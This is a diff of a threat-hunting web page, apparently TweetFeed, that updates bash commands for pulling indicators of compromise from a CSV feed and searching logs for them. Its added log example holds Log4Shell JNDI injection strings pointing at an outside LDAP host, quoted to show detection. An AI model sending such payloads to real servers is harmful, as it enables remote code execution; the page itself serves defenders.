@@ -187,42 +187,65 @@
 				<!-- -->
 				<p style="color: #737373;font-size: 16px;font-family: 'Rubik', sans-serif;">Some bash commands to get IOCs directly from Tweets.</p>
 				<br>
-				<h5><b>1. Get IOCs by type</b> (url / domain / ip / sha256 / md5)</h5>
+				<h5><b>1. Get raw IOCs by type</b> (url / domain / ip / sha256 / md5)</h5>
 				<div class="d-flex justify-content-between">
 					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command:</span>
 					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command1','2')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery2"><span id="textQuery2">Copy to clipboard </span><i id="iconQuery2" class="far fa-clipboard"></i></button>
 				</div>
-				<pre id="command1" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://api.tweetfeed.live/v1/<span style="color:gray;"><b>{Feed}</b></span> | jq -r '.[] | select(.type == "<span style="color:gray;"><b>{type}</b></span>") | .value' <span style="color:gray;"><b>> {Output File}</b></span></pre>
+				<pre id="command1" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, '$3 == "<span style="color:gray;"><b>{type}</b></span>"' | cut -d, -f4 > <span style="color:gray;"><b>{Output File}</b></span></pre>
 				<div class="d-flex justify-content-between">
 					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command example - getting suspicious URLs from today:</span>
 					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command2','3')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery3"><span id="textQuery3">Copy to clipboard </span><i id="iconQuery3" class="far fa-clipboard"></i></button>
 				</div>
-				<pre id="command2" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://api.tweetfeed.live/v1/today | jq -r '.[] | select(.type == "url") | .value' > suspicious_urls.dat</pre>
+				<pre id="command2" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, '$3 == "url"' | cut -d, -f4 > suspicious_urls.dat</pre>
 				Output example:
 				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>url1
-url2
+url1
 url3
 url4
 ...</em></pre>
 				<!-- -->
 				<br>
-				<h5><b>2. Get IOCs by type and tag</b> (phishing / malware / CobaltStrike / ...) <i style="font-size: 14px;" class="far fa-question-circle fa-sm align-self-center" data-toggle="tooltip" data-placement="top" title="All tags can be seen at 'About' section"></i></h5>
+				<h5><b>2. Get raw IOCs by tag</b> (phishing / malware / CobaltStrike / Log4Shell / ...) <i style="font-size: 14px;" class="far fa-question-circle fa-sm align-self-center" data-toggle="tooltip" data-placement="top" title="All tags can be seen at 'About' section"></i></h5>
 				<div class="d-flex justify-content-between">
 					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command:</span>
 					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command3','4')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery4"><span id="textQuery4">Copy to clipboard </span><i id="iconQuery4" class="far fa-clipboard"></i></button>
 				</div>
-				<pre id="command3" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://api.tweetfeed.live/v1/<span style="color:gray;"><b>{Feed}</b></span> | jq -r '.[] | select(.type == "<span style="color:gray;"><b>{type}</b></span>") | select(.tags[] | contains("<span style="color:gray;"><b>{tag}</b></span>")) | .value' <span style="color:gray;"><b>> {Output File}</b></span></pre>
+				<pre id="command3" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, 'tolower($5) ~ "<span style="color:gray;"><b>{tag}</b></span>"' | cut -d, -f4 > <span style="color:gray;"><b>{Output File}</b></span></pre>
 				<div class="d-flex justify-content-between">
 					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command example - getting all IOCs related to CobaltStrike from today:</span>
 					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command4','5')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery5"><span id="textQuery5">Copy to clipboard </span><i id="iconQuery5" class="far fa-clipboard"></i></button>
 				</div>
-				<pre id="command4" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://api.tweetfeed.live/v1/today | jq -r '.[] | select(.type == "ip") | select(.tags[] | contains("CobaltStrike")) | .value' > iocs_CS.dat</pre>
+				<pre id="command4" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, 'tolower($5) ~ "CobaltStrike"' | cut -d, -f4 > iocs_CS.dat</pre>
 				Output example:
-				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>ip1
-ip2
-ip3
-ip4
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>url
+md5
+ip
+ip
+ip
+url
+domain
+md5
+sha256
 ...</em></pre>
+				<!-- -->
+				<br>
+				<h5><b>3. Search IOCs in a file</b> (e.g. log files)</h5>
+				<div class="d-flex justify-content-between">
+					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command:</span>
+					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command5','6')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery6"><span id="textQuery6">Copy to clipboard </span><i id="iconQuery6" class="far fa-clipboard"></i></button>
+				</div>
+				<pre id="command5" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, '$3 == "<span style="color:gray;"><b>{type}</b></span>"' | cut -d, -f4 | while read line; do grep "$line" <span style="color:gray;"><b>{File}</b></span>;done</pre>
+				<div class="d-flex justify-content-between">
+					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command example - searching IPs related to #Log4Shell vulnerability on Apache logs:</span>
+					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command6','7')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery7"><span id="textQuery7">Copy to clipboard </span><i id="iconQuery7" class="far fa-clipboard"></i></button>
+				</div>
+				<pre id="command6" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, '$3 == "ip" && $5 ~ "log4"' | cut -d, -f4 | while read line; do grep "$line" /var/log/apache2/access.log;done</pre>
+				Output example:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>170.210.45.163 - - [16/Dec/2021:21:13:00 +0000] "GET /${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit} HTTP/1.1" 301 589 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
+170.210.45.163 - - [16/Dec/2021:21:13:01 +0000] "GET / HTTP/1.1" 301 509 "-" "${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit}"
+170.210.45.163 - - [17/Dec/2021:01:48:06 +0000] "GET /${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit} HTTP/1.1" 301 5228 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
+170.210.45.163 - - [17/Dec/2021:01:48:07 +0000] "GET / HTTP/1.1" 301 5228 "-" "${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit}"</em></pre>
 				<hr style="border: 1px solid black;" id="microsoftHunt"> <!-- DIVIDER -->
 				<!--<h1 style="font-family: 'Segoe UI', Arial, sans-serif;color: #737373;font-weight: 600;">Microsoft Defender for Endpoint (MDE) <a style="background-color: 
 #00a1f1;border-color: black;font-size: 12px;" class="btn btn-primary btn-sm" href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/advanced-hunting-overview?view=o365-worldwide" target="_blank" role="button">More info <i class="fas fa-external-link-alt"></i></a></h1> -->
